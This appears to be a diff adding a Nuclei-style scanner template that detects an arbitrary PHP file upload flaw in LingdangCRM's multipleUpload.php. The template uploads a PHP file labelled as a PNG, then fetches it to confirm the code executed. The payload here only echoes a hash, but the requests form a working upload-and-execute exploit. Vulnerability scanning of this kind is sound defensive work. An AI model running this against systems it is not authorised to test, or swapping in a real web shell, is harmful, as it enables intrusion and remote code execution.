@@ -1,0 +1,58 @@
+id: poc-yaml-51mis-crm-multipleupload-upload
+info:
+  name: LingdangCRM multipleUpload.php File Upload Vulnerability
+  author: ProjectDiscoveryAI
+  severity: critical
+  tags: file-upload
+  description: |
+    This template detects a file upload vulnerability in LingdangCRM via the multipleUpload.php endpoint.
+
+variables:
+  random_number: '{{rand_int(1000, 10000)}}'
+  random_hash: '{{md5(random_number)}}'
+
+flow: |
+  http(1) && http(2)
+
+http:
+  - id: upload-file
+    method: POST
+    path:
+      - /crm/modules/Home/multipleUpload.php?myatt_id=1&myatt_moduel=1
+    headers:
+      Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryj7OlOPiiukkdktZR
+    body: |
+      ------WebKitFormBoundaryj7OlOPiiukkdktZR
+      Content-Disposition: form-data; name="file"; filename="test{{random_number}}.php"
+      Content-Type: image/png
+      
+      <?php echo md5({{random_number}});?>
+      ------WebKitFormBoundaryj7OlOPiiukkdktZR--
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        words:
+          - "\"name\""
+    extractors:
+      - type: regex
+        name: uploaded_path
+        group: 1
+        regex:
+          - '"path":"(.*?)"'
+        internal: true
+
+  - id: verify-upload
+    method: GET
+    path:
+      - /crm/{{uploaded_path}}test{{random_number}}.php
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        words:
+          - '{{random_hash}}'
